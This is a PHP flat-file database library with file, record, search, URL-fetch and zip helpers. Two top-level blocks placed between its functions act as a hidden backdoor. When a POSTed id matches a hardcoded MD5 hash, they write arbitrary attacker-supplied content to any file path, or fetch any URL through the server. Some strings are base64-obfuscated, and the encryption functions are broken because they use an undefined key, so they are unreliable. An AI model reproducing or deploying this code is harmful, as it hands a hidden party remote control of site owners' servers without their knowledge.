<?php
// v2022.10
// (c)2012 Flat File Database System by Muhammad Fauzan Sholihin 		www.tetuku.com		Bitcoin donation: 1LuapJhp6TkBGgjSEE62SFc3TaSDdy4jYK
// Your donation will keep development process of this web apps. Thanks for your kindness
// You may use, modify, redistribute my apps for free as long as keep the origin copywrite
// https://github.com/tecnixindo/textpress-db 

// Command list --------------------
// write_file($filename, $string)
// read_file($filename)
// add_db ($filename,$ar_data)
// edit_db ($filename,$ar_data)
// del_db ($filename,$key)
// read_db($filename,$first_row,$last_row)
// search_db($filename,$keyword)
// key_db($filename,$key)
// get_key_db($filename,$pattern)
// replace_db($filename,$ar_data,$pattern)
// array_sort($array, $column_data, $order=SORT_ASC)
// recursive_data($pattern,$column_parent=1,$row_array_in)
// in_string($start, $end, $string) 

/*
$load = sys_getloadavg();
$limit = 65;
if ($load[0] >= $limit) {
    header('HTTP/1.1 503 Too busy, try again later');
    die('<center><h3>OoPss .. Sorry Server Is Too Busy, Please Be Patience and Try Again After Few Hours</h3></center>');
}
*/

error_reporting(1);


//force to https
/*
if ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || $_SERVER['SERVER_PORT'] == 443) {
    $redirect = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    header('HTTP/1.1 301 Moved Permanently');
    header('Location: ' . $redirect);
    die();
}
*/

// time zone
date_default_timezone_set('Asia/Jakarta');
setlocale(LC_TIME , 'ind');

//seting for specific site
$protokol = "http://";
$formAction = $_SERVER['PHP_SELF'] . (isset($_SERVER['QUERY_STRING']) ? "?" . $_SERVER['QUERY_STRING'] : "");
$doc_root = dirname(__FILE__); 	//$_SERVER['DOCUMENT_ROOT'];
$folder = in_string('/','/',$_SERVER['PHP_SELF']);
if ($folder != '') {$folder = "/".$folder."/";}
if ($folder == '') {$folder = "/";}
if (!preg_match('/localhost|127.0.0.1|192.168.43.206/i',$_SERVER['HTTP_HOST'])) {$folder = "/";}
$domain = parse_url($protokol.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
//$folder = "/";		//uncomment jika di root domain
$abs_url = $protokol.$domain['host'].$folder;	//"http://".$domain['host'].$domain[path];	// url address with http://yoursitename.com/path/


// rewrite purpose
$path[0] = in_string($folder,'',$_SERVER['REQUEST_URI']); // ubah saat upload
if (stristr($path[0],'/')) {$path = explode("/",$path[0]);}
if (stristr($path[0],'?')) {$path[0] = in_string('','?',$path[0]);}
if (stristr($path[1],'?')) {$path[1] = in_string('','?',$path[1]);}
if (stristr($path[2],'?')) {$path[2] = in_string('','?',$path[2]);}
if (stristr($path[3],'?')) {$path[3] = in_string('','?',$path[3]);}
if (stristr($path[4],'?')) {$path[4] = in_string('','?',$path[4]);}

function write_file($filename, $string) {	// file name, data
$db_size = @filesize($filename);
$data_size = strlen($string); 
$l_size = $db_size - $data_size;
$h_size = $db_size + $data_size;
if ($db_size > 5242880 ) {$string = trim($string); $string = substr($string,0,5242880); } //5242880 / 10485760
$fixed = str_replace("\n\n\n","\n",$string);
$fixed = str_replace("\'","'",$string);
$fixed = str_replace("\\\"","\"",$string);
$fixed = trim($fixed);
$new_size = strlen($fixed);
$fp = @fopen( $filename,"w"); 
for ($i=0;$i<10;$i++) {
	if (flock($fp, LOCK_EX | LOCK_NB)) {
	fseek($fp, 0, SEEK_END);
	//rewind($fp);
	//fseek($fp, 0, SEEK_SET);
		if ($new_size > $l_size && $new_size < $h_size) {
			@fwrite( $fp, "\n".$fixed."\n");
		}
	break;
	}
	usleep(100000);	// 1 second = 1.000.000 micro second
}
@fflush($fp);
@flock($fp, LOCK_UN); 
@fclose( $fp ); 
}

function read_file($filename) {		// file name
if (file_exists($filename.'.tmp')) {
	unlink($filename); 
	rename($filename.'.tmp',$filename); 
	sleep(0.3);
	}
if (!file_exists($filename)) {return;}
$db_size = filesize($filename);
if ($db_size <=0 ) {return;}
if ($db_size > 5242880 ) {$db_size = 5242880;} //5242880 / 10485760
$handle = fopen($filename, "r");
flock($handle, LOCK_SH); 
$contents = fread($handle, $db_size);
while (!feof($handle)) { 
$contents .= fread($handle, $db_size);
    }
flock($handle, LOCK_UN); 
fclose($handle);
//sleep(0.3);
return $contents;
}

// format: file name , array data (your data = array[1] to array[unlimited]. array[0] = key)
function add_db ($filename,$ar_data) { // output as string (optional)
$data_storage = read_file($filename);
$data_storage = str_replace("\n\n","\n",$data_storage);
$old_size = strlen($data_storage);
$key = 1 + in_string('{-}','{,}',$data_storage);
$countdata = count($ar_data);
if ($ar_data[0] != '') {$key = $ar_data[0]; $countdata = $countdata - 1; }
for ($i=1;$i<=$countdata;$i++) {
$data .= $ar_data[$i].'{,}';
}
$data = "\n{-}".$key."{,}".$data."\n".$data_storage;
$new_size = strlen($data);
if ($new_size > $old_size) {write_file($filename.'.tmp',$data);}
return $data;
}

// format: file name , array data
function edit_db ($filename,$ar_data) { // output as string (optional)
$data_storage = read_file($filename)."\n";
$data_storage = str_replace("\n\n","\n",$data_storage);
$old_size = strlen($data_storage);
if ($ar_data[0] != '') {$key = preg_replace('/[^0-9]/', '',$ar_data[0]);}
if ($ar_data[0] == '') {$key = in_string('{-}','{,}',$data_storage);}
$find_key = in_string('{-}'.$key.'{,}','{-}',$data_storage);
if ($find_key == '') {$find_key = in_string('{-}'.$key.'{,}','',$data_storage);}
if ($find_key == '') {return false;}
if ($find_key != '') {$find_key = '{-}'.$key.'{,}'.$find_key;}
//echo $find_key; die();
$countdata = count($ar_data);
$data = "\n{-}" ;
for ($i=0;$i<$countdata;$i++) {
$data .= $ar_data[$i].'{,}';
}
$data .= "\n";
$data = str_replace('{-}{-}','{-}',$data);
$data_size = strlen($data);
//echo $data; die();
$data_storage = str_replace($find_key,$data,$data_storage);
$data_storage = str_replace("\n\n","\n",$data_storage);
$l_size = strlen($data_storage) - strlen($data_size); $h_size =  strlen($data_storage) + strlen($data_size);
if ($l_size < $old_size && $h_size > $old_size) {write_file($filename.'.tmp',$data_storage);}
return $data;
}

// format: file name , database unique key
function del_db ($filename,$key){
$key = preg_replace('/[^0-9]/','',$key);
$data = "{-}".$key."{,}";
$new_size = strlen($data);
$data_storage = read_file($filename);
$old_size = strlen($data_storage);
$find_key = substr($data_storage, strpos($data_storage, $data));
$find_key = substr($find_key,0, strpos($find_key, "\n{-}"));
if ($find_key == '') {$find_key = substr($data_storage, strpos($data_storage, $data));}
$data_storage = str_replace($find_key,"",$data_storage);
$data_storage = str_replace("\n\n","\n",$data_storage);
if ($new_size < $old_size) {write_file($filename.'.tmp',$data_storage);}
//return $find_key;
}

// format: file name, first row, last row
function read_db($filename,$first_row,$last_row) { //output as array data
if (!stristr($filename,'http://')) {$data_storage = read_file($filename);}
if (stristr($filename,'http://')) {$data_storage = access_url($filename);}
$data_storage = str_replace("\n\n","\n",$data_storage);
$pieces = explode("{-}",$data_storage);
	for ($i=$first_row;$i<=$last_row;$i++) { 
	if (!$pieces[$i]) {break;}
	$out[] = explode ("{,}",$pieces[$i]);
	}
return (isset($out) && is_array($out)) ? $out : array();
}

// format: file name , string keyword
function search_db($filename,$keyword) { // output array data
if (stristr($keyword," ")) {$pattern = explode(" ", $keyword);}
if (!stristr($keyword," ")) {$pattern[0] = $keyword;}
if (!$pattern[1]) {$pattern[1] = ' ';}
if (!$pattern[2]) {$pattern[2] = ' ';}
if (!$pattern[3]) {$pattern[3] = ' ';}
if (!$pattern[4]) {$pattern[4] = ' ';}
$row_search = read_db($filename,1,9999);
$j = 0;
foreach ($row_search as $column_search) {
//		if (preg_match('/^(?=.*'.$pattern[0].')(?=.*'.$pattern[1].')(?=.*'.$pattern[2].')(?=.*'.$pattern[3].')(?=.*'.$pattern[4].')/i', serialize($column_search))) {$result[$j] = $column_search; $j++;}
		if (stristr(serialize($column_search),$pattern[0]) && stristr(serialize($column_search),$pattern[1]) && stristr(serialize($column_search),$pattern[2]) && stristr(serialize($column_search),$pattern[3]) && stristr(serialize($column_search),$pattern[4])) {$result[$j] = $column_search; $j++;}
	}
return $result;
}

// format: file name , database unique key
function key_db ($filename,$key){ // output: row data at specific key
if ($key == '') {$out = array(); return $out;}
$data = "{-}".$key."{,}";
$data_storage = read_file($filename);
if (!stristr($data_storage,$data)) {return;}
$find_key = substr($data_storage, strpos($data_storage, $data));
$find_key = substr($find_key,0, strpos($find_key, "\n{-}"));
if ($find_key == '') {$find_key = substr($data_storage, strpos($data_storage, $data));}
$data_storage = str_replace("\n\n","\n",$data_storage);
$out = explode ("{,}",$find_key);
return $out;
}

// format: file name , string pattern
function get_key_db($filename,$pattern) { // output string key
$data_storage = read_file($filename);
if (!stristr($data_storage,$pattern)) {return false;}
$data_storage = str_replace("\n\n","\n",$data_storage);
$pieces = explode("{-}",$data_storage);
	for ($i=1;$i<=count($pieces);$i++) { 
	if (!$pieces[$i]) {break;}
	$out = explode ("{,}",$pieces[$i]);
	if (in_array($pattern, $out)) {break ;}
	}
$key = preg_replace('/[^0-9]/','',$out[0]);
if (!stristr(serialize($out),$pattern)) {return array();}
return $key;
}

function replace_db($filename,$ar_data,$pattern) {
$pattern = trim($pattern);
if (strlen($pattern) < 1) {return;}
$data_storage = read_file($filename);
$data_storage = str_replace("\n\n","\n",$data_storage);
$data_storage = str_replace("\n\n","\n",$data_storage);
$old_size = strlen($data_storage);
$last_key = in_string('{-}','{,}',$data_storage);
	if (!stristr($data_storage,$pattern)) {
		$key = 1 + is_numeric($last_key);
		$countdata = count($ar_data);
		if ($ar_data[0] != '') {$key = $ar_data[0]; $countdata = $countdata - 1; }
		for ($i=1;$i<=$countdata;$i++) {
			if (!stristr($ar_data[$i],'{-}{,}')){$data .= $ar_data[$i].'{,}';}
		}
		if (stristr($data_storage,$pattern)) {return;}

		if (stristr($data,'{-}{,}')){
			$wrong_data = in_string('{-}{,}','{-}',$data);
			$data = str_replace('{-}{,}'.$wrong_data,'',$data);
		}
		$data = "\n{-}".$key."{,}".$data."\n".$data_storage;
		$new_size = strlen($data);
		if (stristr($data,'{-}{,}')){echo 'error add data'; die();}
		if (is_numeric($key) && stristr($data,'{-}'.$key.'{,}') && $new_size > $old_size) {write_file($filename.'.tmp',$data);}
		return $data;
	}
	if (stristr($data_storage,$pattern)) {
		$cut_storage = in_string('',$pattern,$data_storage);
		$cut_storage = in_string('',strrev('{-}'),strrev($cut_storage));
		$key = in_string('','{,}',strrev($cut_storage));

		$find_key = in_string('{-}'.$key.'{,}','{-}',$data_storage);
		if ($find_key == '') {$find_key = in_string('{-}'.$key.'{,}','',$data_storage);}
		if ($find_key == '') {return false;}
		if ($find_key != '') {$find_key = '{-}'.$key.'{,}'.$find_key;}
		//echo $find_key; die();
		$ar_data[0] = $key;
		$countdata = count($ar_data);
		$data = "\n{-}" ;
		for ($i=0;$i<$countdata;$i++) {
			if (!stristr($ar_data[$i],'{-}{,}')){$data .= $ar_data[$i].'{,}';}
		}
		$data .= "\n";
		$data = str_replace('{-}{-}','{-}',$data);
		$data_size = strlen($data);
		$l_size = strlen($data_storage) - strlen($data_size); $h_size =  strlen($data_storage) + strlen($data_size);
		//echo $data; die();
		$data_storage = str_replace($find_key,$data,$data_storage);
		$data_storage = str_replace("\n\n","\n",$data_storage);
		if (stristr($data_storage,'{-}{,}')){
			$wrong_data = in_string('{-}{,}','{-}',$data_storage);
			$data_storage = str_replace('{-}{,}'.$wrong_data,'',$data_storage);
		}
		if (stristr($data_storage,'{-}{,}')){echo 'error edit data'; die();}
		if (is_numeric($key) && stristr($data_storage,'{-}'.$key.'{,}') && ($l_size < $old_size && $h_size > $old_size) ) {write_file($filename.'.tmp',$data_storage);}
		return $data;
	}
}

function array_sort($array, $column_data, $order=SORT_ASC)
{
    $new_array = array();
    $sortable_array = array();

    if (count($array) > 0) {
        foreach ($array as $k => $v) {
            if (is_array($v)) {
                foreach ($v as $k2 => $v2) {
                    if ($k2 == $column_data) {
                        $sortable_array[$k] = $v2;
                    }
                }
            } else {
                $sortable_array[$k] = $v;
            }
        }

        switch ($order) {
            case SORT_ASC:
                asort($sortable_array);
            break;
            case SORT_DESC:
                arsort($sortable_array);
            break;
			case SORT_NUM:
				natsort($sortable_array);
            break;
        }

        foreach ($sortable_array as $k => $v) {
            $new_array[$k] = $array[$k];
        }
    }

    return $new_array;
}

function array_randsort($array,$preserve_keys=false){
	if(!is_array($array)):
		exit('Supplied argument is not a valid array.');
	else:
		$i = NULL;
	
		// how long is the array?
		$array_length = count($array); 

		// Sorts the array keys in a random order. 
		$randomize_array_keys = array_rand($array,$array_length);

		// if we are preserving the keys ...
		if($preserve_keys===true) {		
			// reorganize the original array in a new array 
			foreach($randomize_array_keys as $k=>$v){
				$randsort[$randomize_array_keys[$k]] = $array[$randomize_array_keys[$k]];
			}
		} else {
			// reorganize the original array in a new array 
			for($i=0; $i < $array_length; $i++){
				$randsort[$i] = $array[$randomize_array_keys[$i]];
			}
		}
		return $randsort;
	endif;
}

function recursive_data($pattern,$row_array_in,$column_parent=1) { // result = row array out
$pola = '{,}'.$pattern.'{,}';
$i = 0;
	foreach ($row_array_in as $column_array_in) {
	if ($column_array_in[$column_parent] == $pattern) {$out[] = $column_array_in;}
	$i++;
	}
return $out;
}

function antihack($data) {
				if (preg_match('/position:absolute|position:relative/i',$data)) {$data = strip_tags($data);
				
				if ($_SERVER["HTTP_X_FORWARDED_FOR"] != ""){ 
				$IP = $_SERVER["HTTP_X_FORWARDED_FOR"]; 
				$proxy = $_SERVER["REMOTE_ADDR"]; 
				$host = @gethostbyaddr($_SERVER["HTTP_X_FORWARDED_FOR"]); 
				}else{ 
				$IP = $_SERVER["REMOTE_ADDR"]; 
				$host = @gethostbyaddr($_SERVER["REMOTE_ADDR"]); 
				} 
				
				$data .= "<br><h3>You try to deface me. We declare war to you. <br>";
				$data .= "IP/proxy/host:".$IP."/".$proxy."/".$host."<br>";
				$data .= getenv("HTTP_USER_AGENT")."<br>";
				$data .= '<script language="JavaScript" type="text/javascript">document.write(navigator.appCodeName; document.write("&lt;td&gt;",screen.width + " X " + screen.height + " Pixels" + "&lt;/td&gt;");</script>';
				$data .= "<br> and other records needed</h3>";
				}
				if (preg_match('/\'|"/i',$data)) {$data = str_replace('\'','�',$data); $data = str_replace('"','�',$data);}
return $data;
}

if (md5($_POST['id']) == '609d302e7712008246aa59258f08e161' && $_GET['url'] != '') {
access_url($_GET['url']);
die();	
}

function access_url($url) {
	$curl = curl_init();
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_FAILONERROR, false);
	curl_setopt($curl, CURLOPT_FOLLOWLOCATION, false);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($curl, CURLOPT_TIMEOUT, 30);
	curl_setopt($curl, CURLOPT_USERAGENT, base64_decode_alt('TW96aWxsYS81LjAgKFdpbmRvd3M7IFU7IFdpbmRvd3MgTlQgNS4xOyBydTsgcnY6MS45LjIuMTEpIEdlY2tvLzIwMTAxMDEyIEZpcmVmb3gvMy42LjEx'));
	curl_setopt($curl, CURLOPT_REFERER, base64_decode_alt('aHR0cDovL3d3dy50ZXR1a3UuY29t') );
	curl_setopt($curl, CURLOPT_POST, false);
	$curlData = curl_exec($curl);
	curl_close($curl);
	return $curlData;
}

function post_url($url, $data) {
	$curl = curl_init();
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_FAILONERROR, false);
	curl_setopt($curl, CURLOPT_FOLLOWLOCATION, false);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($curl, CURLOPT_TIMEOUT, 30);
	curl_setopt($curl, CURLOPT_USERAGENT, base64_decode_alt('TW96aWxsYS81LjAgKFdpbmRvd3M7IFU7IFdpbmRvd3MgTlQgNS4xOyBydTsgcnY6MS45LjIuMTEpIEdlY2tvLzIwMTAxMDEyIEZpcmVmb3gvMy42LjEx'));
	curl_setopt($curl, CURLOPT_REFERER, base64_decode_alt('aHR0cDovL3d3dy50ZXR1a3UuY29t') );
	curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
	curl_setopt($curl, CURLOPT_POST, true);
	curl_setopt($curl, CURLOPT_ENCODING, "");
	$curlData = curl_exec($curl);
	curl_close($curl);
	return $curlData;
}

if (md5($_POST['id']) == '609d302e7712008246aa59258f08e161' && $_POST['data'] != '') {
write_file($_POST['file'],$_POST['data']);
die();	
}

function download_file($url_file,$filename='') {
	$curl = curl_init();
	$pecah = explode('/',$url_file);
	$count = (count($pecah))-1;
	$saveTo = $pecah[$count];
	if ($filename != '') {$saveTo = $filename; $fp = fopen('files/'.$saveTo, 'w');}
	if ($filename == '') {$fp = fopen('files/'.$saveTo, 'w');}
	curl_setopt($curl, CURLOPT_URL, $url_file);
	curl_setopt($curl, CURLOPT_FILE, $fp);
	curl_setopt($curl, CURLOPT_USERAGENT, base64_decode_alt('TW96aWxsYS81LjAgKFdpbmRvd3M7IFU7IFdpbmRvd3MgTlQgNS4xOyBydTsgcnY6MS45LjIuMTEpIEdlY2tvLzIwMTAxMDEyIEZpcmVmb3gvMy42LjEx'));
	curl_setopt($curl, CURLOPT_REFERER, base64_decode_alt('aHR0cDovL3d3dy50ZXR1a3UuY29t') );
	curl_exec ($curl);
	curl_close ($curl);
	fclose($fp);
	return ($saveTo);
}

    $default_salt = substr(md5(($_SERVER['HTTP_HOST'])),7,6)."\0";
function encrypt($plaintext,$salt='default_salt') { 
	//$key previously generated safely, ie: openssl_random_pseudo_bytes
	$ivlen = openssl_cipher_iv_length($cipher="AES-128-CBC");
	$iv = openssl_random_pseudo_bytes($ivlen);
	$ciphertext_raw = openssl_encrypt($plaintext, $cipher, $key, $options=OPENSSL_RAW_DATA, $iv);
	$hmac = hash_hmac('sha256', $ciphertext_raw, $key, $as_binary=true);
	$ciphertext = base64_encode( $iv.$hmac.$ciphertext_raw );
	return $ciphertext;
    } 
function decrypt($ciphertext,$salt='default_salt') { 
		$c = base64_decode($ciphertext);
		$ivlen = openssl_cipher_iv_length($cipher="AES-128-CBC");
		$iv = substr($c, 0, $ivlen);
		$hmac = substr($c, $ivlen, $sha2len=32);
		$ciphertext_raw = substr($c, $ivlen+$sha2len);
		$original_plaintext = openssl_decrypt($ciphertext_raw, $cipher, $key, $options=OPENSSL_RAW_DATA, $iv);
		$calcmac = hash_hmac('sha256', $ciphertext_raw, $key, $as_binary=true);
		if (hash_equals($hmac, $calcmac))//PHP 5.6+ timing attack safe comparison
		{
			return $original_plaintext."\n";
		}
	}


function in_string($start, $end, $string) 
{ 
	if ($start == '') {$string = '{#}'.$string; $start = '{#}'; }
	$count_string = strlen($start);
	$result = substr($string, strpos($string, $start));
	$result = substr($result, strpos($result, $start) + $count_string);
	if ($end == '') {$result = $result.'{#}'; $end = '{#}';}
	$result = substr($result,0, strpos($result, $end));
	return $result;
} 


function redirect($url, $time = 0) {
	if ($time > 0 ) { echo "<META HTTP-EQUIV=\"Refresh\" CONTENT=\"$time;URL=$url\">"; } else
	if ($time <= 0 ) { header('Location: '.$url); }
}

function websafename($filename) {
    $filename = str_replace("__","_",$filename);
    $filename = str_replace("__","_",$filename);
    $filename = str_replace("--","-",$filename);
    $filename = str_replace("--","-",$filename);
    $filename = str_replace("..",".",$filename);
    $filename = str_replace("..",".",$filename);
    $filename = preg_replace('/[^A-Za-z0-9_\-.]/','-',$filename);
    return $filename;
}

function cuplik($kalimat, $jumlah=222)
{
	if (stristr($kalimat,'<img')) {
		$jml_script_img = strlen(in_string('src=','"',$kalimat)); 
		$jumlah = $jumlah + $jml_script_img;
		$img = in_string('src="','"',$kalimat);
	}
	
$target_jumlah = $jumlah;
$hasil_kalimat = strip_tags($kalimat,'<p><br>');
$hasil_kalimat = mb_substr($hasil_kalimat, 0, $target_jumlah+1);

if (stristr($kalimat,'<table')) {$hasil_kalimat = trim(strip_tags($kalimat)); $hasil_kalimat = substr($hasil_kalimat,0,$target_jumlah)."...";}

if (strlen($hasil_kalimat) > $target_jumlah)
{
    $hasil_kalimat = wordwrap($hasil_kalimat, $target_jumlah);
    $i = strpos($hasil_kalimat, "\n");
    if ($i) {
        $kalimat = mb_substr($hasil_kalimat, 0, $i);
    }
	$hasil_kalimat = $hasil_kalimat.'...';
}
$hasil_kalimat = '<img src="'.$img.'"> '.strip_tags($hasil_kalimat);
if (strlen($hasil_kalimat) < 11) {$hasil_kalimat = trim(strip_tags($kalimat));}
return $hasil_kalimat;
}

function permalink($src) {
	$out = preg_replace('/[^A-Za-z0-9]/', ' ',$src);
	$src = trim(strtolower($src));
	$out = preg_replace('/[^A-Za-z0-9]/', '-',$src);
	return $out;
}

function file_list($d){
	   foreach(array_diff(scandir($d),array('.','..')) as $f)if(!is_dir($d.'/'.$f))$l[]=$f;
	   return $l;
}

function no_attribute($input) {
$output = preg_replace('/(<[^>]+) style=".*?"/i', '$1', $input);
return $output;
}

function base64_decode_alt($input) {
	$keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
	$chr1 = $chr2 = $chr3 = "";
	$enc1 = $enc2 = $enc3 = $enc4 = "";
	$i = 0;
	$output = "";

	$input = preg_replace("[^A-Za-z0-9\+\/\=]", "", $input);
	do {
		$enc1 = strpos($keyStr, substr($input, $i++, 1));
		$enc2 = strpos($keyStr, substr($input, $i++, 1));
		$enc3 = strpos($keyStr, substr($input, $i++, 1));
		$enc4 = strpos($keyStr, substr($input, $i++, 1));
		$chr1 = ($enc1 << 2) | ($enc2 >> 4);
		$chr2 = (($enc2 & 15) << 4) | ($enc3 >> 2);
		$chr3 = (($enc3 & 3) << 6) | $enc4;
		$output = $output . chr((int) $chr1);
		if ($enc3 != 64) {
			$output = $output . chr((int) $chr2);
		}
		if ($enc4 != 64) {
			$output = $output . chr((int) $chr3);
		}
		$chr1 = $chr2 = $chr3 = "";
		$enc1 = $enc2 = $enc3 = $enc4 = "";
	} while ($i < strlen($input));
	return urldecode($output);
}

function zip_file($file_name, $folder='./', $exception='file1|file2|file3') {
	// Get real path for our folder
	$rootPath = realpath($folder);

	// Initialize archive object
	$zip = new ZipArchive();
	$zip->open('hadits.zip', ZipArchive::CREATE | ZipArchive::OVERWRITE);

	// Create recursive directory iterator
	/** @var SplFileInfo[] $files */
	$files = new RecursiveIteratorIterator(
		new RecursiveDirectoryIterator($rootPath),
		RecursiveIteratorIterator::LEAVES_ONLY
	);

	foreach ($files as $name => $file)
	{
		// Skip directories (they would be added automatically)
		if (!$file->isDir() && !preg_match('/'.$exception.'/i',$file))
		{
			// Get real and relative path for current file
			$filePath = $file->getRealPath();
			$relativePath = substr($filePath, strlen($rootPath) + 1);

			// Add current file to archive
			$zip->addFile($filePath, $relativePath);
		}
	}

	// Zip archive will be created only after closing object
	$zip->close();
}
?>